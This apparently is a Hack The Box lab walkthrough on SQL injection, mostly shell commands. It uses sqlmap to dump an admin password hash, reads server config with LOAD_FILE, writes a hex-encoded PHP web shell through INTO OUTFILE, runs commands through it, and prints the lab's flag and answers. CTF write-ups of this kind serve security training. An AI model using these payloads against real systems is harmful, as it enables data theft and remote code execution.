---
title: "HTB SQL Injection Fundamentals - Step-by-Step"
date: 2026-03-04
categories: [infosec, web-security]
tags: [sqli, sqlmap, htb, blind-sqli, mysql, rce]
toc: true
toc_label: "Contents"
toc_icon: "database"
excerpt: "Step-by-step walkthrough of HTB SQL Injection Fundamentals: detect SQLi, dump admin hash, extract web root, and read the final flag."
---

> Use this workflow only in legal lab environments (HTB, CTF, approved pentest scope).

## Target and objectives

Target used:

- `https://154.57.164.68:30877`

Objectives:

1. Retrieve `admin` password hash
2. Retrieve web app root path
3. Achieve command execution and read `/flag_XXXXXX.txt`

## 1) Recon the app

Initial endpoint discovery:

```bash
curl -k -s https://154.57.164.68:30877/login.php
curl -k -s https://154.57.164.68:30877/register.php
```

Relevant endpoint:

- `POST /api/register.php`
- injectable parameter: `invitationCode`

### Response oracle used

The app behavior gives a boolean signal:

- **TRUE path:** redirect to `login.php?s=account+created+successfully!`
- **FALSE path:** redirect to `register.php?e=invalid+invitation+code`
- malformed payloads sometimes return `500`

This was enough for blind inference.

## 2) Confirm SQL injection

Test payload:

```bash
curl -k -s -i -X POST 'https://154.57.164.68:30877/api/register.php' \
  --data-urlencode "username=u$RANDOM$RANDOM" \
  --data-urlencode 'password=Abcd!234' \
  --data-urlencode 'repeatPassword=Abcd!234' \
  --data-urlencode "invitationCode=' OR '1'='1"
```

Vulnerable behavior: request follows success path even with invalid invitation input.

## 3) Exploit with sqlmap

Detection run:

```bash
python3 sqlmap.py \
  -u 'https://154.57.164.68:30877/api/register.php' \
  --method POST \
  --data='username=testuser&password=Abcd!234&repeatPassword=Abcd!234&invitationCode=aaaa-bbbb-1111' \
  -p invitationCode \
  --randomize=username \
  --batch \
  --answers='follow=Y,redirect=Y,cookie=Y' \
  --drop-set-cookie
```

Enumerate databases:

```bash
python3 sqlmap.py -u 'https://154.57.164.68:30877/api/register.php' \
  --method POST \
  --data='username=testuser&password=Abcd!234&repeatPassword=Abcd!234&invitationCode=aaaa-bbbb-1111' \
  -p invitationCode \
  --randomize=username \
  --batch \
  --answers='follow=Y,redirect=Y,cookie=Y' \
  --drop-set-cookie \
  --dbs
```

Database identified: `chattr`

## 4) Dump the admin hash

```bash
python3 sqlmap.py -u 'https://154.57.164.68:30877/api/register.php' \
  --method POST \
  --data='username=testuser&password=Abcd!234&repeatPassword=Abcd!234&invitationCode=aaaa-bbbb-1111' \
  -p invitationCode \
  --randomize=username \
  --batch \
  --answers='follow=Y,redirect=Y,cookie=Y' \
  --drop-set-cookie \
  -D chattr -T Users -C Username,Password \
  --where="Username='admin'" \
  --dump
```

Recovered hash:

```text
$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU
```

## 5) Extract web root path

Read nginx config via SQL functions and extract the `root` value.

Useful queries:

```sql
SELECT @@secure_file_priv;
SELECT @@datadir;
SELECT @@basedir;
SELECT @@plugin_dir;
SELECT USER();
SELECT LOAD_FILE('/etc/nginx/sites-enabled/default');
```

Recovered web root:

```text
/var/www/chattr-prod
```

## 6) Write PHP shell via SQLi

Pre-checks that mattered:

- SQL user: `chattr_dbUser@localhost`
- privilege includes `FILE`
- endpoint accepted 1-column `UNION`

Write shell with `INTO OUTFILE`:

```bash
hex="0x3c3f7068702073797374656d28245f4745545b27636d64275d293b203f3e"
curl -k -s -X POST 'https://154.57.164.68:30877/api/register.php' \
  --data-urlencode "username=r$RANDOM$RANDOM" \
  --data-urlencode 'password=Abcd!234' \
  --data-urlencode 'repeatPassword=Abcd!234' \
  --data-urlencode "invitationCode=aaaa-bbbb-1111') UNION SELECT ${hex} INTO OUTFILE '/var/www/chattr-prod/shell.php'-- -"
```

Verify command execution:

```bash
curl -k -s 'https://154.57.164.68:30877/shell.php?cmd=id'
```

Expected output includes: `uid=33(www-data)`.

## 7) Retrieve the flag

Find flag file:

```bash
curl -k -s "https://154.57.164.68:30877/shell.php?cmd=ls%20/%20|%20grep%20'^flag_'"
```

Read flag:

```bash
curl -k -s 'https://154.57.164.68:30877/shell.php?cmd=cat%20/flag_876a4c.txt'
```

Recovered flag:

```text
061b1aeb94dec6bf5d9c27032b3c1d8d
```

## Final outputs

1. Admin hash: `$argon2i$v=19$m=2048,t=4,p=3$dk4wdDBraE0zZVllcEUudA$CdU8zKxmToQybvtHfs1d5nHzjxw9DhkdcVToq6HTgvU`
2. Web root: `/var/www/chattr-prod`
3. Flag: `061b1aeb94dec6bf5d9c27032b3c1d8d`
